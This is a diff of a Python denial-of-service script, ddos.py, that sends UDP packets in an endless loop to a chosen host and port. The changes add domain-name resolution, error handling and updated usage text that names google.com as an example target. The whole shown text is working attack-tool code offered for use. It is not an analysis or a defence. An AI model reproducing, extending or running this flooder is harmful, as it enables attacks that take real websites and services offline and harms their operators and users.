@@ -15,6 +15,7 @@ if system() == "Linux":
 else: 
     os.system ("cls && cls")
 overflowerror = 0
+oserror = 0
 def banner():
     
     b = f"""{Fore.YELLOW}
@@ -26,10 +27,10 @@ def banner():
     {Style.RESET_ALL}"""
     print(b)
     print(f"{Fore.BLUE}\n\t\t\t Github : https://Github.com/Ali2004-linux\n\t\t\t    {Fore.MAGENTA}Github : https://Github.com/A1Python\n\t\t\t{Style.RESET_ALL}      {Fore.BLUE}Gmail : ALi2004h.linux@gmail.com{Style.RESET_ALL}")
-    print(Fore.RED+"\n\t\tUsage : python3 ddos.py http://target.com or Enter Ip Site!")
-    print(Fore.GREEN+"\n\tExmple : python3 ddos.py http://google.com or python3 ddos.py 127.0.0.1")
+    print(Fore.RED+"\n\t\t   Usage : python3 ddos.py <Domain Name> or Enter <Site IP>")
+    print(Fore.GREEN+"\n\t       Exmple : python3 ddos.py google.com or python3 ddos.py 127.0.0.1")
     print(Fore.MAGENTA+"\n\t\t\t\t<<<<Default Port Is 80>>>>"+Fore.WHITE)
-    print(Fore.GREEN+"\n\t\t\tAli2004h {Ali HemmatNia} ---- Modified by A1Python"+Fore.WHITE)
+    print(Fore.GREEN+"\n\t\t    Ali2004h {Ali HemmatNia} ---- Modified by A1Python"+Fore.WHITE)
     
 def main():
     os.system('clear && clear')
@@ -41,10 +42,14 @@ def main():
         port = 0
         banner()
         global overflowerror
+        global oserror
         if overflowerror == 1:
             print(f"\n>>>> {Fore.MAGENTA}Previous time,You didn't enter port number between 0-65535{Style.RESET_ALL}")
             overflowerror -= 1
-        
+        elif oserror == 1:
+            print(f"\n>>>> {Fore.BLUE}You Entered Zero,Enter port number more then 0(Zero){Style.RESET_ALL}")
+            oserror -= 1
+        #modified by A1Python
         port_int = input("\nDo you want change port(Y & N): ").lower()
         if port_int == "y":
             while True:
@@ -57,14 +62,18 @@ def main():
             port += 80
         try:
             while True:
-                s.sendto(t, (ip,port))
+                s.sendto(t, (socket.gethostbyname(ip),port))
                 f +=  1
                 #Modified by A1Python
-                print(f"{Fore.GREEN} [***]{Style.RESET_ALL} {Fore.WHITE} Sending Packet To{Style.RESET_ALL} {Fore.RED}{ip}{Style.RESET_ALL} Port: {Fore.GREEN}{port}{Style.RESET_ALL} Count: {Fore.BLUE}[{f}]!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} [***]{Style.RESET_ALL} {Fore.WHITE} Sending Packet To{Style.RESET_ALL} {Fore.RED}{socket.gethostbyname(ip)}{Style.RESET_ALL} Port: {Fore.GREEN}{port}{Style.RESET_ALL} Count: {Fore.BLUE}[{f}]!{Style.RESET_ALL}")
         except socket.gaierror:
-            print(Fore.GREEN+"\n \t [*"+Fore.WHITE+"*"+Fore.GREEN+"*]"+Fore.RED+" Plaese Connect To Internet!! or Address Site NotFound Or Not Supported (Https) in Socket\n")
+            print(f"{Fore.GREEN}\n   [***]  {Fore.RED}Entered DOMANIN NAME not found, You have to written like this: {Fore.MAGENTA}google.com\n{Style.RESET_ALL}")
+        except OSError:
+            oserror += 1
+            main()
     except IndexError:
         banner()
+        #Modified by A1Python
         print(f"\n{Fore.GREEN}--->{Style.RESET_ALL }{Fore.RED} You didn't type IP address"+Style.RESET_ALL)
     except OverflowError:
         overflowerror += 1
